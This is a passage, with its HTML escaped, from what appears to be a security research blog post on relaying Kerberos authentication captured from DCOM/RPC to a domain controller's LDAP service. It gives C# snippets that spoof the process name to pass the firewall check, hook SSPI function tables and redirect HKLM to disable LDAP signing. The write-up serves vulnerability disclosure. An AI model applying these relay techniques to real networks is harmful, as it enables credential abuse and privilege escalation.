href=\"https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamew\"&gt;GetModuleFileName&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which gets the value from the &lt;/span&gt;&lt;span class=\"c4\"&gt;ImagePathName&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;field in the process parameters block referenced by the PEB. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;We can modify this string in our own process to be anything we like, then when COM is initialized, that will be sent to RPCSS which will use it for the firewall check. Once the check passes, RPCSS will return the TCP string bindings for our COM server when unmarshalling the OBJREF and the client will be able to connect. This can all be done with only minor in-process modifications from .NET and no external servers required.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c23\" id=\"h.87n38litfqxj\"&gt;&lt;span class=\"c25 c17\"&gt;Capturing Authentication&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;At this point a new RPC connection will be made to our process to communicate with the marshaled COM object. During that process the COM client must authenticate, so we can capture and relay that authentication to another service locally or remotely. What&amp;#39;s the best way to capture that authentication traffic?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;Before we do anything we need to select what authentication we want to receive, and this will be reflected in the OBJREF&amp;#39;s security bindings. As we&amp;#39;re doing everything using the existing COM runtime we can register what RPC authentication services to use when calling &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity\"&gt;CoInitializeSecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the COM server through the &lt;/span&gt;&lt;span class=\"c4\"&gt;asAuthSvc&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;parameter.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.5188af134394dbd4e93278caa48ce70cc2e7b4b8\"&gt;&lt;/a&gt;&lt;a id=\"t.7\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;svcs = &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;SOLE_AUTHENTICATION_SERVICE[] { &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;&amp;nbsp; &amp;nbsp; new&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;SOLE_AUTHENTICATION_SERVICE() { &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; dwAuthnSvc = RpcAuthenticationType.Kerberos,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; pPrincipalName = &lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;HOST/DC.domain.com&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;str = SetProcessModuleName(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;System&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c17 c13\"&gt;try&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp;CoInitializeSecurity(IntPtr.Zero, svcs.Length, svcs, &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_DEFAULT,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; IntPtr.Zero);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13 c17\"&gt;finally&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; SetProcessModuleName(str);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;In the above code, we register to only receive Kerberos authentication and we can also specify an arbitrary SPN as I described in the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\"&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. One thing to note is that the call to &lt;/span&gt;&lt;span class=\"c4\"&gt;CoInitializeSecurity&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;will establish the connection to RPCSS and pass the executable filename. Therefore we need to modify the filename before calling the API as we can&amp;#39;t change it after the connection has been established. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;For &lt;/span&gt;&lt;span&gt;swag&lt;/span&gt;&lt;span&gt;&amp;nbsp;points I specify the filename &lt;/span&gt;&lt;span class=\"c4\"&gt;System&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than build the full path to &lt;/span&gt;&lt;span class=\"c4\"&gt;svchost.exe&lt;/span&gt;&lt;span&gt;. This is the &lt;/span&gt;&lt;span&gt;name assigned to the kernel which is also granted access through the firewall. We restore the original filename after the call to &lt;/span&gt;&lt;span class=\"c4\"&gt;CoInitializeSecurity &lt;/span&gt;&lt;span class=\"c9\"&gt;to reduce the risk of it breaking something unexpectedly.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;That covers the selection of the authentication service to use, but doesn&amp;#39;t help us actually capture that authentication. My first thought to capture the authentication was to find the socket handle for the TCP server, close it and create a new socket in its place. Then I could directly process the RPC protocol and parse out the authentication. This felt somewhat risky as the RPC runtime would still think it has a valid TCP server socket and might fail in unexpected ways. Also it felt like a lot of work, when I have a perfectly good RPC protocol parser built into Windows.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;I then resigned myself to hooking the SSPI APIs, although ideally I&amp;#39;d prefer not to do so. However, once I started looking at the RPC runtime library there weren&amp;#39;t any imports for the SSPI APIs to hook into and I really didn&amp;#39;t want to patch the functions themselves. It turns out that the RPC runtime loads security packages dynamically, based on the authentication service requested and the configuration of the &lt;/span&gt;&lt;span class=\"c4\"&gt;HKLM\\SOFTWARE\\Microsoft\\Rpc\\SecurityService&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;registry key.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c5\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiooNt9vGeuuGX-qWowAPJv7twW2ASFXiXwvwVb9QQimr6U2WnzYWPcRQKHXDdnn8mXuNaC0l0Fvs9fvHbYbh72r4G2_AnCLjaVC2HtnzoL2sgb8hOiw-EJyldnejADOu8ddBamYLMOP0d-Km3g1HX02MOhi033j7usXaJJ8MeSHKWJBK4C3gcY426H/s877/image1%20%286%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiooNt9vGeuuGX-qWowAPJv7twW2ASFXiXwvwVb9QQimr6U2WnzYWPcRQKHXDdnn8mXuNaC0l0Fvs9fvHbYbh72r4G2_AnCLjaVC2HtnzoL2sgb8hOiw-EJyldnejADOu8ddBamYLMOP0d-Km3g1HX02MOhi033j7usXaJJ8MeSHKWJBK4C3gcY426H/s877/image1%20%286%29.png\" border=\"0\" alt=\"Screenshot of the Registry Editor showing HKLM\\SOFTWARE\\Microsoft\\Rpc\\SecurityService key\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The key, shown in the above screenshot has a list of values. The value&amp;#39;s name is the number &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/com/com-authentication-service-constants\"&gt;assigned&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the authentication service, for example 16 is &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span&gt;. The value&amp;#39;s data is then the name of the DLL to load which provides the API, for Kerberos this is &lt;/span&gt;&lt;span class=\"c4\"&gt;sspicli.dll&lt;/span&gt;&lt;span class=\"c9\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The RPC runtime then loads a table of security functions from the DLL by calling its exported &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initsecurityinterfacew\"&gt;InitSecurityInterface&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;method. At least for &lt;/span&gt;&lt;span class=\"c4\"&gt;sspicli&lt;/span&gt;&lt;span&gt;&amp;nbsp;the table is always the same and is a pre-initialized structure in the DLL&amp;#39;s data section. This is perfect, we can just call &lt;/span&gt;&lt;span class=\"c4\"&gt;InitSecurityInterface&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;before the RPC runtime is initialized to get a pointer to the table then modify its function pointers to point to our own implementation of the API. As an added bonus the table is in a writable section of the DLL so we don&amp;#39;t even need to modify the memory protection.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;Of course implementing the hooks is non-trivial. This is made more complex because RPC uses the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/190ab8de-dc42-49cf-bf1b-ea5705b7a087\"&gt;DCE style Kerberos authentication&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;which requires two tokens from the client before the server considers the authentication complete. This requires maintaining more state to keep the RPC server and client implementations happy. I&amp;#39;ll leave this as an exercise for the reader.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c23\" id=\"h.dkczv6jimbo9\"&gt;&lt;span class=\"c25 c17\"&gt;Choosing a Relay Target Service&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The next step is to choose a suitable target service to relay the authentication to. For &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=325\"&gt;issue 325&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;I relayed the authentication to the same machine&amp;#39;s DCOM activator RPC service and was able to achieve an arbitrary file write.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;I thought that maybe I could do so again, so I modified my &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html\"&gt;.NET RPC client&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;to handle the relayed authentication and tried accessing local RPC services. No matter what RPC server or function I called, I always got an access denied error. Even if I wrote my own RPC server which didn&amp;#39;t have any checks, it would fail.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Digging into the failure it turned out that at some point (I don&amp;#39;t know specifically when), Microsoft added a mitigation into the RPC runtime to make it very difficult to relay authentication back to the same system. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.d16597b280dba3c3840bf804233cdcf3fbce3cb7\"&gt;&lt;/a&gt;&lt;a id=\"t.8\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c10\"&gt;void&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;SSECURITY_CONTEXT&lt;/span&gt;&lt;span class=\"c3\"&gt;::&lt;/span&gt;&lt;span class=\"c11\"&gt;ValidateUpgradeCriteria&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;() {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c3\"&gt;(&lt;/span&gt;&lt;span class=\"c16 c13\"&gt;this&lt;/span&gt;&lt;span class=\"c3\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c11\"&gt;AuthnLevel &lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c3\"&gt;(&lt;/span&gt;&lt;span class=\"c11\"&gt;IsLoopback&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;())&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c13\"&gt;this&lt;/span&gt;&lt;span class=\"c3\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c11\"&gt;UnsafeLoopbackAuth &lt;/span&gt;&lt;span class=\"c3\"&gt;=&lt;/span&gt;&lt;span class=\"c11\"&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class=\"c3 c17\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c3 c17\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"c4\"&gt;SSECURITY_CONTEXT::ValidateUpgradeCriteria&lt;/span&gt;&lt;span&gt;&amp;nbsp;method is called when receiving RPC authentication packets. If the authentication level for the RPC connection is less than &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&lt;/span&gt;&lt;span&gt;&amp;nbsp;such as &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the authentication was from the same system then a flag is set to true in the security context. The &lt;/span&gt;&lt;span class=\"c4\"&gt;IsLoopback &lt;/span&gt;&lt;span&gt;function calls the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/querycontextattributes--general\"&gt;QueryContextAttributes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API for the undocumented &lt;/span&gt;&lt;span class=\"c4\"&gt;SECPKG_ATTR_IS_LOOPBACK&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;attribute value from the server security context. This attribute indicates if the authentication was from the local system.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;When an RPC call is made the server will check if the flag is true, if it is then the call will be immediately rejected before any code is called in the server including the RPC interface&amp;#39;s security callback. The only way to pass this check is either the authentication doesn&amp;#39;t come from the local system or the authentication level is &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;or above which then requires the client to know the session key for signing or encryption. The RPC client will also check for local authentication and will increase the authentication level if necessary. This is an effective way of preventing the relay of local authentication to elevate privileges.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Instead as I was focussing on Kerberos, I came to the conclusion that relaying the authentication to an enterprise network service was more useful. As the default settings for a domain controller&amp;#39;s LDAP service still do not enforce signing, it would seem a reasonable target. As we&amp;#39;ll see, this provides a limitation of the source of the authentication, as it must not enable Integrity otherwise the LDAP server will enforce signing.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The problem with LDAP is I didn&amp;#39;t have any code which implemented the protocol. I&amp;#39;m sure there is some .NET code to do it somewhere, but the fewer dependencies I have the better. As I mentioned in the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\"&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, Windows has a builtin &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/_ldap/\"&gt;LDAP library&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"c4\"&gt;wldap32.dll&lt;/span&gt;&lt;span class=\"c9\"&gt;. Could I repurpose its API but convert it into using relayed authentication?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;Unsurprisingly the library doesn&amp;#39;t have a &amp;quot;Enable relayed authentication&amp;quot; mode, but after a few minutes in a disassembler, it was clear it was also delay-loading the SSPI interfaces through the &lt;/span&gt;&lt;span class=\"c4\"&gt;InitSecurityInterface &lt;/span&gt;&lt;span&gt;method. I could repurpose my code for capturing the authentication for relaying the authentication. There was initially a minor issue, accidentally or on purpose there was a stray call to &lt;/span&gt;&lt;span class=\"c4\"&gt;QueryContextAttributes&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;which was directly imported, so I needed to patch that through an &lt;/span&gt;&lt;span class=\"c4\"&gt;Import Address Table (IAT)&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;hook as distasteful as that was.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;There was still a problem however. When the client connects it always tries to enable LDAP signing, as we are relaying authentication with no access to the session key this causes the connection to fail. Setting the option value &lt;/span&gt;&lt;span class=\"c4\"&gt;LDAP_OPT_SIGN&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the library to false didn&amp;#39;t change this behavior. I needed to set the &lt;/span&gt;&lt;span class=\"c4\"&gt;LdapClientIntegrity &lt;/span&gt;&lt;span&gt;registry value to 0 in the LDAP service&amp;#39;s key before initializing the library. Unfortunately that key is only modifiable by administrators. I could have modified the library itself, but as it was checking the key during &lt;/span&gt;&lt;span class=\"c4\"&gt;DllMain &lt;/span&gt;&lt;span class=\"c9\"&gt;it would be a complex dance to patch the DLL in the middle of loading.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;Instead I decided to override the &lt;/span&gt;&lt;span class=\"c4\"&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;&lt;span&gt;&amp;nbsp;key. This is possible for the Win32 APIs by using the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regoverridepredefkey\"&gt;RegOverridePredefKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. The purpose of the API is to allow installers to redirect administrator-only modifications to the registry into a writable location, however for our purposes we can also use it to redirect the reading of the &lt;/span&gt;&lt;span class=\"c4\"&gt;LdapClientIntegrity &lt;/span&gt;&lt;span class=\"c9\"&gt;registry value.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.701cb52d2a1d8adec608337c8e749b549cee1cf3\"&gt;&lt;/a&gt;&lt;a id=\"t.9\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;[DllImport(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;Advapi32.dll&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;)]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;static&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;extern&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;int&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;RegOverridePredefKey(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; IntPtr hKey,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; IntPtr hNewHKey&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19\"&gt;&lt;span class=\"c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;[DllImport(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;&lt;span class=\"c12\"&gt;, CharSet = CharSet.Unicode, SetLastError = &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;true&lt;/span&gt;&lt;span class=\"c6\"&gt;)]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;static&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;extern&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;IntPtr LoadLibrary(&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;string&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;libname);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19\"&gt;&lt;span class=\"c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;static&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;readonly&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;IntPtr HKEY_LOCAL_MACHINE = &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;IntPtr(-2147483646);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19\"&gt;&lt;span class=\"c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;static&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;void&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;OverrideLocalMachine(RegistryKey key)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;int&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;res = RegOverridePredefKey(HKEY_LOCAL_MACHINE, &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key?.Handle.DangerousGetHandle() ?? IntPtr.Zero);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;(res != 0)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span 